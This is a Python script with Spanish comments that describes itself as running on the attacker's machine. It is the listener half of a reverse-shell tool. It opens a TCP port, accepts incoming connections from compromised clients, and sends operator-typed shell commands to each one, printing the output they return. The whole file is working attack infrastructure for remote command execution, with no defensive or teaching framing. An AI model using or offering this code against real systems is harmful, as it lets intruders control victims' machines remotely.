"""
Este script es ejecutado en la maquina del atacante donde esperaremos conexiones de los clientes
"""
import subprocess
import threading
import socket
import sys
import os

FIN_COMANDO = b'#00#'

def inicializar_servidor(puerto):
    """
    Crea el servidor bind y se queda esperando
    """
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('', int(puerto)))  # hace el bind en cualquier interfaz disponible

    servidor.listen(5) # peticiones de conexion simultaneas
    print('Escuchando peticiones en el puerto %s' % puerto)
    while True:
        cliente, addr = servidor.accept()
        print ('Conexion desde:    ')
        print(f"{addr[0]}:{addr[1]} Conectado!")
        hilo = threading.Thread(target=leer_comandos, args=(cliente, ))
        hilo.start()


def leer_comandos(cliente):
    """
    Función con la interfaz de usuario
    """
    comando = ''
    while comando != 'exit': 
        comando = input('$> ') # lee un str no binario
        respuesta = mandar_comando(comando, cliente)
        desplegar_salida_comando(respuesta)
    cliente.close()


def mandar_comando(comando, conexion):
    """
    Envía el comando a través del socket, haciendo conversiones necesarias
    Espera la respuesta del servidor y la regresa
    comando viene como str
    """
    comando = comando.encode('utf-8') # convertir a binario
    comando += FIN_COMANDO
    conexion.send(comando)
    salida = leer_respuesta(conexion)
    return salida

def leer_respuesta(socket):
    """
    Lee el canal de comunicación del servidor y reconstruye
    la salida asociada
    """
    salida = socket.recv(2048)
    while not salida.endswith(FIN_COMANDO):
        salida += socket.recv(2048)
    a_quitar_caracteres = len(FIN_COMANDO)
    return salida[:-a_quitar_caracteres]

def desplegar_salida_comando(salida):
    """
    Despliega la salida regresada por el servidor
    salida es una cadena binaria
    """
    salida = salida.decode('utf-8')
    print(salida)
    



        
if __name__ == '__main__':
    puerto = sys.argv[1]
    conexion = inicializar_servidor(puerto)
